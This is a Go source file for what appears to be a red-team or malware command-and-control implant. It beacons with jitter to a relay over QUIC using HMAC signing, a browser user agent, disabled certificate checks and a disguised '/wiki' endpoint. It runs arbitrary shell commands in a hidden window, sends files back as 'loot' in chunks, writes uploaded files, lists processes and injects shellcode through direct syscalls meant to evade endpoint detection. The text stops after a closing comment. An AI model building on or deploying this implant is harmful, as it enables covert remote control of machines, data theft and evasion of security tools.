package main

import (
	"crypto/hmac"
	"crypto/md5"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/google/uuid"
	"github.com/quic-go/quic-go/http3"
	"golang.org/x/sys/windows"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

// Build-time configuration - can be overridden with -ldflags during compilation
var (
	listenerProtocol = "quic"      // Protocol: quic (or https, wss, ssh)
	listenerHost     = "localhost" // Change to your relay IP/hostname
	listenerPort     = "8081"      // QUIC port (default: 8081)
	listenerEndpoint = "/wiki"
	// HMAC Key - MUST match relay's AGENT_HMAC_KEY in relay.config
	hmacKeyHex = "ce12644929818da6e92742dfb711644785e4379c291b192552f0265e70608330"

	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

var reconnectInterval = 15
var currentInterval = 15
var jitterSeconds = 10
var hmacKey = []byte(hmacKeyHex)
var agentID = uuid.New().String()
var currentCommandID int
var http3Client = &http.Client{
	Transport: &http3.RoundTripper{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, // Skip certificate verification for self-signed certs
		},
	},
}

// sendHTTP3Request sends a request using HTTP3/QUIC
func sendHTTP3Request(endpoint string, data []byte, headers map[string]string) ([]byte, error) {
	// Create the full URL
	url := fmt.Sprintf("https://%s:%s%s", listenerHost, listenerPort, endpoint)

	// Create request
	req, err := http.NewRequest("POST", url, strings.NewReader(string(data)))
	if err != nil {
		return nil, fmt.Errorf("failed to create HTTP3 request: %v", err)
	}

	// Add headers
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	// Set User-Agent
	req.Header.Set("User-Agent", userAgent)

	// Send request
	resp, err := http3Client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to send HTTP3 request: %v", err)
	}
	defer resp.Body.Close()

	// Read response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read HTTP3 response: %v", err)
	}

	// Create response in the format expected by the agent
	response := map[string]interface{}{
		"status": resp.StatusCode,
		"body":   string(body),
	}

	return json.Marshal(response)
}

func listenerEndpointURL() string {
	path := strings.TrimSpace(listenerEndpoint)
	if path == "" || path == "/" {
		return fmt.Sprintf("%s://%s:%s", listenerProtocol, listenerHost, listenerPort)
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	path = strings.TrimRight(path, "/")
	return fmt.Sprintf("%s://%s:%s%s", listenerProtocol, listenerHost, listenerPort, path)
}

// HMAC signing functions
func generateHMAC(message string, key []byte) string {
	h := hmac.New(sha256.New, key)
	h.Write([]byte(message))
	return hex.EncodeToString(h.Sum(nil))
}

func signRequest(method, path, body string) (string, string) {
	timestamp := strconv.FormatInt(time.Now().Unix(), 10)
	message := fmt.Sprintf("%s%s%s%s", method, path, timestamp, body)
	signature := generateHMAC(message, hmacKey)
	return timestamp, signature
}

type AgentRegistration struct {
	UUID              string `json:"uuid"`
	Name              string `json:"name"`
	IP                string `json:"ip"`
	OS                string `json:"os"`
	ReconnectInterval int    `json:"reconnectInterval"`
}

type Command struct {
	ID             int     `json:"id"`
	AgentID        string  `json:"agentId"`
	Command        string  `json:"command"`
	ClientUsername string  `json:"clientUsername"`
	Status         string  `json:"status"`
	Output         string  `json:"output"`
	CreatedAt      string  `json:"createdAt"`
	ExecutedAt     *string `json:"executedAt"`
}

type CommandResponse struct {
	CommandID int    `json:"commandId"`
	Output    string `json:"output"`
	Status    string `json:"status"`
}

// Windows API structures for process listing
type ProcessEntry32 struct {
	Size              uint32
	Usage             uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	Threads           uint32
	ParentProcessID   uint32
	PriorityClassBase int32
	Flags             uint32
	ExeFile           [260]uint16
}

type ProcessInfo struct {
	PID    uint32
	Name   string
	Parent uint32
}

func main() {
	// Use the global agent ID
	agentName := fmt.Sprintf("Agent-%s", agentID[:8])

	// Get system info
	//hostname, _ := os.Hostname()
	osInfo := fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)

	// Registration loop with full interval backoff on failure
	for {
		reg := AgentRegistration{
			UUID:              agentID,
			Name:              agentName,
			IP:                getLocalIP(),
			OS:                osInfo,
			ReconnectInterval: reconnectInterval,
		}

		if err := registerAgent(reg); err != nil {
			// Back off for full reconnect interval to avoid bad state
			time.Sleep(time.Duration(reconnectInterval) * time.Second)
			continue
		}

		// Registration successful, break out of retry loop
		break
	}

	// Start GraphQL subscription for commands (this also serves as heartbeat)
	go subscribeToCommands(agentID)

	// Keep main thread alive - command polling handles everything
	select {}
}

func registerAgent(reg AgentRegistration) error {
	// Marshal the core registration data
	jsonData, err := json.Marshal(reg)
	if err != nil {
		return err
	}

	// HMAC goes in body, not headers
	body := string(jsonData)
	timestamp, signature := signRequest("POST", listenerEndpoint, body)

	// Wrap the data with HMAC fields (using json.RawMessage to preserve exact bytes)
	wrapper := map[string]interface{}{
		"data":      json.RawMessage(jsonData),
		"timestamp": timestamp,
		"signature": signature,
	}

	// Marshal the wrapper
	finalData, err := json.Marshal(wrapper)
	if err != nil {
		return err
	}

	// Create QUIC request with NO custom headers - just plain JSON!
	headers := map[string]string{
		"Content-Type": "application/json",
	}

	respData, err := sendHTTP3Request(listenerEndpoint, finalData, headers)
	if err != nil {
		return err
	}

	// Parse response
	var regResponse map[string]interface{}
	if err := json.Unmarshal(respData, &regResponse); err != nil {
		return fmt.Errorf("invalid response format: %v", err)
	}

	statusCode, ok := regResponse["status"].(float64)
	if !ok || statusCode != 200 {
		return fmt.Errorf("registration failed with status: %v", statusCode)
	}

	return nil
}

func getLocalIP() string {
	// Get the real local IP address
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func subscribeToCommands(agentID string) {
	// Calculate initial interval with jitter
	intervalWithJitter := calculateIntervalWithJitter()
	ticker := time.NewTicker(time.Duration(intervalWithJitter) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// Check if interval has changed
			if currentInterval != reconnectInterval {
				ticker.Stop()
				currentInterval = reconnectInterval
				intervalWithJitter = calculateIntervalWithJitter()
				ticker = time.NewTicker(time.Duration(intervalWithJitter) * time.Second)
			} else {
				// Recalculate jitter for next iteration
				ticker.Stop()
				intervalWithJitter = calculateIntervalWithJitter()
				ticker = time.NewTicker(time.Duration(intervalWithJitter) * time.Second)
			}

			commands, err := getPendingCommands(agentID)
			if err != nil {
				continue
			}

			// Execute each pending command
			for _, cmd := range commands {
				if cmd.Status == "pending" {
					// Set global command ID for chunked transfers
					currentCommandID = cmd.ID

					output, err := executeCommand(cmd.Command)
					if err != nil {
						output = fmt.Sprintf("Error: %v", err)
					}

					// Send command response back to server
					sendCommandResponse(cmd.ID, output, "completed")
				}
			}
		}
	}
}

// calculateIntervalWithJitter returns the beacon interval with jitter applied
func calculateIntervalWithJitter() int {
	if jitterSeconds == 0 {
		return reconnectInterval
	}

	// Generate random jitter between -jitterSeconds and +jitterSeconds
	jitter := rand.Intn(2*jitterSeconds+1) - jitterSeconds
	interval := reconnectInterval + jitter

	// Ensure interval is at least 1 second
	if interval < 1 {
		interval = 1
	}

	return interval
}

func getPendingCommands(agentID string) ([]Command, error) {
	// Simple poll request (no GraphQL)
	pollRequest := map[string]interface{}{
		"agentId": agentID,
	}

	jsonData, err := json.Marshal(pollRequest)
	if err != nil {
		return nil, err
	}

	// HMAC goes in body, not headers
	body := string(jsonData)
	timestamp, signature := signRequest("POST", listenerEndpoint, body)

	// Wrap the data with HMAC fields (using json.RawMessage to preserve exact bytes)
	wrapper := map[string]interface{}{
		"data":      json.RawMessage(jsonData),
		"timestamp": timestamp,
		"signature": signature,
	}

	// Marshal the wrapper
	finalData, err := json.Marshal(wrapper)
	if err != nil {
		return nil, err
	}

	// Create QUIC request with NO custom headers - just plain JSON!
	headers := map[string]string{
		"Content-Type": "application/json",
	}

	respData, err := sendHTTP3Request(listenerEndpoint, finalData, headers)
	if err != nil {
		return nil, err
	}

	// Parse response
	var httpResponse map[string]interface{}
	if err := json.Unmarshal(respData, &httpResponse); err != nil {
		return nil, fmt.Errorf("invalid response format: %v", err)
	}

	statusCode, ok := httpResponse["status"].(float64)
	if !ok || statusCode != 200 {
		return nil, fmt.Errorf("poll request failed: status %v", statusCode)
	}

	// Extract the body from the response
	bodyStr, ok := httpResponse["body"].(string)
	if !ok {
		return nil, fmt.Errorf("invalid response body format")
	}

	var result struct {
		Commands []Command `json:"commands"`
	}

	if err := json.Unmarshal([]byte(bodyStr), &result); err != nil {
		return nil, err
	}

	return result.Commands, nil
}

// Built-in command handlers
func handleBuiltinCommand(command string) (string, error) {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return "", fmt.Errorf("empty command")
	}

	cmd := parts[0]
	args := parts[1:]

	switch cmd {
	case "ls":
		return handleLs(args)
	case "get":
		return handleGet(args)
	case "put":
		return handlePut(args)
	case "cd":
		return handleCd(args)
	case "kill":
		return handleKill(args)
	case "ps":
		return handlePs(args)
	case "exec":
		return handleExec(args)
	case "reconnect":
		return handleReconnect(args)
	case "injectsc":
		return handleInjectSc(args)
	case "rm":
		return handleRm(args)
	case "rmdir":
		return handleRmdir(args)
	case "jitter":
		return handleJitter(args)
	default:
		return "", fmt.Errorf("not a builtin command")
	}
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {

	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	_, r := bananaphone.Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		windows.PAGE_READWRITE,
	)
	if r != nil {
		return
	}
	//write memory
	bananaphone.WriteMemory(shellcode, baseA)

	var oldprotect uintptr
	_, r = bananaphone.Syscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		return
	}
	var hhosthread uintptr
	_, r = bananaphone.Syscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	windows.WaitForSingleObject(windows.Handle(hhosthread), 0xffffffff)
	if r != nil {
		return
	}
}

// We expect the shellcode payload to have its own ExitThread handler for when the
// program exits or exits unexpectedly. Otherwise we get a SEGFAULT because the
// shellcode will run off the end of the buffer. This is a non issuue for us
// since go-donut by default adds in this handler to prevent this.
func handleInjectSc(args []string) (string, error) {
	if len(args) == 0 {
		return "", fmt.Errorf("usage: injectsc <hex_shellcode>")
	}

	// Get shellcode from arguments - join all args in case there are spaces
	hexShellcode := strings.Join(args, "")

	// Remove any quotes if present
	hexShellcode = strings.Trim(hexShellcode, "\"")

	// Remove any whitespace
	hexShellcode = strings.ReplaceAll(hexShellcode, " ", "")
	hexShellcode = strings.ReplaceAll(hexShellcode, "\n", "")
	hexShellcode = strings.ReplaceAll(hexShellcode, "\r", "")
	hexShellcode = strings.ReplaceAll(hexShellcode, "\t", "")

	// Validate hex data
	if len(hexShellcode) == 0 {
		return "", fmt.Errorf("empty shellcode provided")
	}

	// Check if hex data is valid (even length)
	if len(hexShellcode)%2 != 0 {
		return "", fmt.Errorf("invalid hex shellcode: odd length")
	}

	// Decode hex data to bytes
	shellcode, err := hex.DecodeString(hexShellcode)
	if err != nil {
		return "", fmt.Errorf("failed to decode hex shellcode: %v", err)
	}

	// Validate decoded data
	if len(shellcode) == 0 {
		return "", fmt.Errorf("decoded shellcode is empty")
	}

	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if e != nil {
		panic(e)
	}
	//resolve the functions and extract the syscalls
	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		panic(e)
	}
	protect, e := bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		panic(e)
	}
	createthread, e := bp.GetSysID("NtCreateThreadEx")
	if e != nil {
		panic(e)
	}

	createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)

	return "shellcode executed", nil
}

func handleLs(args []string) (string, error) {
	path := "."
	if len(args) > 0 {
		path = args[0]
	}

	// Resolve path
	absPath, err := filepath.Abs(path)
	if err != nil {
		return "", fmt.Errorf("invalid path: %v", err)
	}

	// Check if path exists
	info, err := os.Stat(absPath)
	if err != nil {
		return "", fmt.Errorf("path does not exist: %v", err)
	}

	if !info.IsDir() {
		return "", fmt.Errorf("not a directory: %s", path)
	}

	// List directory contents
	entries, err := os.ReadDir(absPath)
	if err != nil {
		return "", fmt.Errorf("failed to read directory: %v", err)
	}

	var result strings.Builder
	result.WriteString(fmt.Sprintf("📁 %s\n", absPath))

	// Create loot entries for each item
	var lootEntries []map[string]interface{}

	// Sort entries: directories first, then files
	var dirs, files []os.DirEntry
	for _, entry := range entries {
		if entry.IsDir() {
			dirs = append(dirs, entry)
		} else {
			files = append(files, entry)
		}
	}

	// Add directories first
	for _, entry := range dirs {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		result.WriteString(fmt.Sprintf("├── 📁 %s/\n", entry.Name()))

		// Create loot entry
		fullPath := filepath.Join(absPath, entry.Name())
		lootEntry := map[string]interface{}{
			"type":        "directory",
			"path":        fullPath,
			"name":        entry.Name(),
			"size":        0,
			"permissions": info.Mode().String(),
			"modified":    info.ModTime().Format("2006-01-02 15:04:05"),
		}
		lootEntries = append(lootEntries, lootEntry)
	}

	// Add files
	for _, entry := range files {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		size := info.Size()
		sizeStr := formatFileSize(size)
		result.WriteString(fmt.Sprintf("├── 📄 %s (%s)\n", entry.Name(), sizeStr))

		// Create loot entry
		fullPath := filepath.Join(absPath, entry.Name())
		lootEntry := map[string]interface{}{
			"type":        "file",
			"path":        fullPath,
			"name":        entry.Name(),
			"size":        size,
			"permissions": info.Mode().String(),
			"modified":    info.ModTime().Format("2006-01-02 15:04:05"),
		}
		lootEntries = append(lootEntries, lootEntry)
	}

	// Add loot entries to output (hidden but parseable)
	if len(lootEntries) > 0 {
		lootJSON, err := json.Marshal(lootEntries)
		if err == nil {
			// Use a simple delimiter that the GUI can filter out
			result.WriteString(fmt.Sprintf("\nLOOT_ENTRIES:%s", string(lootJSON)))
		}
	}

	return result.String(), nil
}

// formatFileSize formats file size in human-readable format
func formatFileSize(size int64) string {
	if size == 0 {
		return "0B"
	}

	const unit = 1024
	if size < unit {
		return fmt.Sprintf("%dB", size)
	}

	div, exp := int64(unit), 0
	for n := size / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}

	units := []string{"KB", "MB", "GB", "TB"}
	if exp >= len(units) {
		exp = len(units) - 1
	}

	return fmt.Sprintf("%.1f%s", float64(size)/float64(div), units[exp])
}

const (
	// Chunk size for file transfers (2MB)
	chunkSize = 2 * 1024 * 1024
	// Threshold for using chunked transfers (10MB)
	chunkThreshold = 10 * 1024 * 1024
)

func handleGet(args []string) (string, error) {
	if len(args) == 0 {
		return "", fmt.Errorf("usage: get <filepath>")
	}

	filePath := args[0]

	// Get current working directory
	currentDir, err := os.Getwd()
	if err != nil {
		return "", fmt.Errorf("failed to get current directory: %v", err)
	}

	// Create absolute path by combining current directory with file path
	var absPath string
	if filepath.IsAbs(filePath) {
		// Path is already absolute
		absPath = filePath
	} else {
		// Path is relative, combine with current directory
		absPath = filepath.Join(currentDir, filePath)
	}

	// Get file info to check size
	fileInfo, err := os.Stat(absPath)
	if err != nil {
		return "", fmt.Errorf("failed to get file info: %v", err)
	}

	filename := filepath.Base(absPath)
	fileSize := fileInfo.Size()

	// If file is small (<10MB), use old method for simplicity
	if fileSize < chunkThreshold {
		return handleGetSmallFile(absPath, filename)
	}

	// Use chunked transfer for large files
	return handleGetChunkedFile(absPath, filename, fileSize)
}

// handleGetSmallFile handles files under 10MB using the original method
func handleGetSmallFile(absPath, filename string) (string, error) {
	// Read file content
	content, err := os.ReadFile(absPath)
	if err != nil {
		return "", fmt.Errorf("failed to read file: %v", err)
	}

	// Calculate MD5 hash
	hash := md5.Sum(content)
	hashString := hex.EncodeToString(hash[:])

	// Create loot entry for the file
	lootEntry := map[string]interface{}{
		"type":    "file",
		"name":    filename,
		"path":    absPath,
		"size":    float64(len(content)),
		"content": string(content),
		"md5":     hashString,
	}

	// Convert to JSON
	lootJSON, err := json.Marshal([]map[string]interface{}{lootEntry})
	if err != nil {
		return "", fmt.Errorf("failed to marshal loot entry: %v", err)
	}

	// Return clean message with loot entry embedded
	return fmt.Sprintf("got %s!\nLOOT_ENTRIES:%s", filename, string(lootJSON)), nil
}

// handleGetChunkedFile handles large files using chunked transfer
func handleGetChunkedFile(absPath, filename string, fileSize int64) (string, error) {
	file, err := os.Open(absPath)
	if err != nil {
		return "", fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	totalChunks := int((fileSize + chunkSize - 1) / chunkSize)

	fileContent, err := io.ReadAll(file)
	if err != nil {
		return "", fmt.Errorf("failed to read file for MD5: %v", err)
	}

	hash := md5.Sum(fileContent)
	expectedMD5 := hex.EncodeToString(hash[:])

	sessionID, err := initiateChunkedTransfer(absPath, filename, fileSize, totalChunks, expectedMD5)
	if err != nil {
		return "", fmt.Errorf("failed to initiate transfer: %v", err)
	}

	for i := 0; i < totalChunks; i++ {
		start := int64(i) * chunkSize
		end := start + chunkSize
		if end > fileSize {
			end = fileSize
		}

		chunkData := fileContent[start:end]
		chunkHash := md5.Sum(chunkData)
		chunkMD5 := hex.EncodeToString(chunkHash[:])

		if err := uploadChunk(sessionID, i, chunkData, chunkMD5); err != nil {
			return "", fmt.Errorf("failed to upload chunk %d/%d: %v", i+1, totalChunks, err)
		}
	}

	if err := completeChunkedTransfer(sessionID); err != nil {
		return "", fmt.Errorf("failed to complete transfer: %v", err)
	}

	return fmt.Sprintf("got %s! (%d bytes in %d chunks, md5=%s)", filename, fileSize, totalChunks, expectedMD5), nil
}

// initiateChunkedTransfer starts a new file transfer session
func initiateChunkedTransfer(absPath, filename string, fileSize int64, totalChunks int, expectedMD5 string) (string, error) {
	initReq := map[string]interface{}{
		"agentId":      agentID,
		"commandId":    currentCommandID,
		"filename":     filename,
		"originalPath": absPath,
		"totalSize":    fileSize,
		"totalChunks":  totalChunks,
		"expectedMd5":  expectedMD5,
	}

	jsonData, err := json.Marshal(initReq)
	if err != nil {
		return "", err
	}

	// Sign and wrap request
	body := string(jsonData)
	timestamp, signature := signRequest("POST", listenerEndpoint, body)

	wrapper := map[string]interface{}{
		"data":      json.RawMessage(jsonData),
		"timestamp": timestamp,
		"signature": signature,
	}

	finalData, err := json.Marshal(wrapper)
	if err != nil {
		return "", err
	}

	headers := map[string]string{
		"Content-Type": "application/json",
	}

	respData, err := sendHTTP3Request(listenerEndpoint, finalData, headers)
	if err != nil {
		return "", err
	}

	// Parse outer response wrapper (from sendHTTP3Request)
	var respWrapper map[string]interface{}
	if err := json.Unmarshal(respData, &respWrapper); err != nil {
		return "", fmt.Errorf("failed to parse response wrapper: %v", err)
	}

	// Extract the body string and parse it
	bodyStr, ok := respWrapper["body"].(string)
	if !ok {
		return "", fmt.Errorf("invalid response format - body missing. Response: %+v", respWrapper)
	}

	var response map[string]interface{}
	if err := json.Unmarshal([]byte(bodyStr), &response); err != nil {
		return "", fmt.Errorf("failed to parse response body: %v. Body: %s", err, bodyStr)
	}

	sessionID, ok := response["sessionId"].(string)
	if !ok {
		return "", fmt.Errorf("no session ID in response. Response: %+v", response)
	}

	return sessionID, nil
}

// uploadChunk uploads a single file chunk
func uploadChunk(sessionID string, chunkIndex int, chunkData []byte, chunkMD5 string) error {
	chunkReq := map[string]interface{}{
		"sessionId":  sessionID,
		"chunkIndex": chunkIndex,
		"chunkData":  hex.EncodeToString(chunkData),
		"chunkMd5":   chunkMD5,
	}

	jsonData, err := json.Marshal(chunkReq)
	if err != nil {
		return err
	}

	// Sign and wrap request
	body := string(jsonData)
	timestamp, signature := signRequest("POST", listenerEndpoint, body)

	wrapper := map[string]interface{}{
		"data":      json.RawMessage(jsonData),
		"timestamp": timestamp,
		"signature": signature,
	}

	finalData, err := json.Marshal(wrapper)
	if err != nil {
		return err
	}

	headers := map[string]string{
		"Content-Type": "application/json",
	}

	respData, err := sendHTTP3Request(listenerEndpoint, finalData, headers)
	if err != nil {
		return err
	}

	// Parse outer response wrapper (from sendHTTP3Request)
	var respWrapper map[string]interface{}
	if err := json.Unmarshal(respData, &respWrapper); err != nil {
		return err
	}

	// Extract the body string and parse it
	bodyStr, ok := respWrapper["body"].(string)
	if !ok {
		return fmt.Errorf("invalid response format")
	}

	var response map[string]interface{}
	if err := json.Unmarshal([]byte(bodyStr), &response); err != nil {
		return err
	}

	status, _ := response["status"].(float64)
	if status != 200 {
		return fmt.Errorf("server returned status %v", status)
	}

	return nil
}

// completeChunkedTransfer signals the server to assemble and finalize the transfer
func completeChunkedTransfer(sessionID string) error {
	completeReq := map[string]interface{}{
		"sessionId": sessionID,
		"complete":  true,
	}

	jsonData, err := json.Marshal(completeReq)
	if err != nil {
		return err
	}

	// Sign and wrap request
	body := string(jsonData)
	timestamp, signature := signRequest("POST", listenerEndpoint, body)

	wrapper := map[string]interface{}{
		"data":      json.RawMessage(jsonData),
		"timestamp": timestamp,
		"signature": signature,
	}

	finalData, err := json.Marshal(wrapper)
	if err != nil {
		return err
	}

	headers := map[string]string{
		"Content-Type": "application/json",
	}

	respData, err := sendHTTP3Request(listenerEndpoint, finalData, headers)
	if err != nil {
		return err
	}

	// Parse outer response wrapper (from sendHTTP3Request)
	var respWrapper map[string]interface{}
	if err := json.Unmarshal(respData, &respWrapper); err != nil {
		return err
	}

	// Extract the body string and parse it
	bodyStr, ok := respWrapper["body"].(string)
	if !ok {
		return fmt.Errorf("invalid response format")
	}

	var response map[string]interface{}
	if err := json.Unmarshal([]byte(bodyStr), &response); err != nil {
		return err
	}

	status, _ := response["status"].(float64)
	if status != 200 {
		return fmt.Errorf("server returned status %v", status)
	}

	return nil
}

func handlePut(args []string) (string, error) {
	if len(args) < 2 {
		return "", fmt.Errorf("usage: put <remote_filepath> <hex_data>")
	}

	// Remove quotes from path if present
	remoteFilePath := args[0]
	if strings.HasPrefix(remoteFilePath, "\"") && strings.HasSuffix(remoteFilePath, "\"") {
		remoteFilePath = remoteFilePath[1 : len(remoteFilePath)-1]
	}

	// Remove quotes from hex data if present
	hexData := args[1]
	if strings.HasPrefix(hexData, "\"") && strings.HasSuffix(hexData, "\"") {
		hexData = hexData[1 : len(hexData)-1]
	}

	// Validate hex data
	if len(hexData) == 0 {
		return "", fmt.Errorf("empty hex data provided")
	}

	// Check if hex data is valid (even length)
	if len(hexData)%2 != 0 {
		return "", fmt.Errorf("invalid hex data: odd length")
	}

	// Decode hex data to bytes
	fileData, err := hex.DecodeString(hexData)
	if err != nil {
		return "", fmt.Errorf("failed to decode hex data: %v", err)
	}

	// Validate decoded data
	if len(fileData) == 0 {
		return "", fmt.Errorf("decoded file data is empty")
	}

	// Get current working directory
	currentDir, err := os.Getwd()
	if err != nil {
		return "", fmt.Errorf("failed to get current directory: %v", err)
	}

	// Create absolute path by combining current directory with remote file path
	var absPath string
	if filepath.IsAbs(remoteFilePath) {
		// Path is already absolute
		absPath = remoteFilePath
	} else {
		// Path is relative, combine with current directory
		absPath = filepath.Join(currentDir, remoteFilePath)
	}

	// Validate the path to prevent directory traversal attacks
	cleanPath, err := filepath.Abs(absPath)
	if err != nil {
		return "", fmt.Errorf("invalid file path: %v", err)
	}

	// Ensure the path is within the current directory (basic security check)
	if !strings.HasPrefix(cleanPath, currentDir) {
		return "", fmt.Errorf("file path outside current directory not allowed")
	}

	// Create directory if it doesn't exist
	dir := filepath.Dir(cleanPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return "", fmt.Errorf("failed to create directory: %v", err)
	}

	// Write file
	if err := os.WriteFile(cleanPath, fileData, 0644); err != nil {
		return "", fmt.Errorf("failed to write file: %v", err)
	}

	// Get just the filename for the clean message
	filename := filepath.Base(cleanPath)

	// Calculate MD5 hash
	hash := md5.Sum(fileData)
	hashString := hex.EncodeToString(hash[:])

	// Create loot entry for the uploaded file
	lootEntry := map[string]interface{}{
		"type":    "file",
		"name":    filename,
		"path":    cleanPath,
		"size":    float64(len(fileData)),
		"content": string(fileData),
		"md5":     hashString,
	}

	// Convert to JSON
	lootJSON, err := json.Marshal([]map[string]interface{}{lootEntry})
	if err != nil {
		return "", fmt.Errorf("failed to marshal loot entry: %v", err)
	}

	// Return clean message with loot entry embedded
	return fmt.Sprintf("put %s!\nLOOT_ENTRIES:%s", filename, string(lootJSON)), nil
}

func handleCd(args []string) (string, error) {
	if len(args) == 0 {
		// Show current directory
		dir, err := os.Getwd()
		if err != nil {
			return "", fmt.Errorf("failed to get current directory: %v", err)
		}
		return dir, nil
	}

	newDir := args[0]

	// Change directory
	err := os.Chdir(newDir)
	if err != nil {
		return "", fmt.Errorf("failed to change directory: %v", err)
	}

	// Return new directory
	dir, err := os.Getwd()
	if err != nil {
		return "", fmt.Errorf("failed to get new directory: %v", err)
	}

	return fmt.Sprintf("Changed directory to: %s", dir), nil
}

func handleKill(args []string) (string, error) {
	// Kill command now exits the agent gracefully
	go func() {
		// Give time for response to be sent
		time.Sleep(1 * time.Second)
		os.Exit(0)
	}()

	return "Agent terminating...", nil
}

func handlePs(args []string) (string, error) {
	processes, err := getProcessList()
	if err != nil {
		return "", fmt.Errorf("failed to get process list: %v", err)
	}

	var result strings.Builder
	result.WriteString("PID\tName\t\tParent\n")
	result.WriteString("---\t----\t\t------\n")

	for _, proc := range processes {
		result.WriteString(fmt.Sprintf("%d\t%s\t\t%d\n",
			proc.PID, proc.Name, proc.Parent))
	}

	return result.String(), nil
}

func getProcessList() ([]ProcessInfo, error) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	createToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	process32First := kernel32.NewProc("Process32FirstW")
	process32Next := kernel32.NewProc("Process32NextW")

	// Create snapshot
	snapshot, _, _ := createToolhelp32Snapshot.Call(
		uintptr(0x2), // TH32CS_SNAPPROCESS
		uintptr(0),
	)
	if snapshot == 0 {
		return nil, fmt.Errorf("failed to create snapshot")
	}
	defer windows.CloseHandle(windows.Handle(snapshot))

	var processes []ProcessInfo
	var pe32 ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	// Get first process
	ret, _, _ := process32First.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		return nil, fmt.Errorf("failed to get first process")
	}

	// Iterate through processes
	for {
		processName := windows.UTF16PtrToString(&pe32.ExeFile[0])
		processes = append(processes, ProcessInfo{
			PID:    pe32.ProcessID,
			Name:   processName,
			Parent: pe32.ParentProcessID,
		})

		// Get next process
		ret, _, _ := process32Next.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}

	return processes, nil
}

func decodeCommand(command string) string {
	commandMap := map[string]string{
		"1":  "ls",
		"2":  "get",
		"3":  "put",
		"4":  "cd",
		"5":  "kill",
		"6":  "ps",
		"7":  "exec",
		"8":  "reconnect",
		"9":  "injectsc",
		"10": "rm",
		"11": "rmdir",
		"12": "jitter",
	}

	// Parse command to get the first word
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return command
	}

	cmdID := parts[0]

	// Check if ID exists in map
	if cmdName, ok := commandMap[cmdID]; ok {
		// Replace ID with command name
		parts[0] = cmdName
		return strings.Join(parts, " ")
	}

	// No mapping found (either already decoded or custom command), pass through
	return command
}

func executeCommand(command string) (string, error) {
	if command == "" {
		return "", fmt.Errorf("empty command")
	}

	// Decode command ID to command name (if encoded)
	decodedCommand := decodeCommand(command)

	// Check if it's a builtin command first
	output, err := handleBuiltinCommand(decodedCommand)
	if err == nil {
		return output, nil
	}

	// If not a builtin or error, try system execution
	if err.Error() != "not a builtin command" {
		return "", err
	}

	// Handle direct cmd.exe execution
	if strings.HasPrefix(strings.ToLower(decodedCommand), "cmd.exe") {
		return executeCmdDirect(decodedCommand)
	}

	// Use system() for full command execution (supports pipes, redirects, etc.)
	// Cross-platform command execution
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", decodedCommand)
		// Hide console window on Windows
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000, // CREATE_NO_WINDOW
		}
	} else {
		cmd = exec.Command("sh", "-c", decodedCommand)
	}

	systemOutput, err := cmd.CombinedOutput()
	if err != nil {
		return string(systemOutput), err
	}

	return string(systemOutput), nil
}

// executeCmdDirect handles direct cmd.exe execution
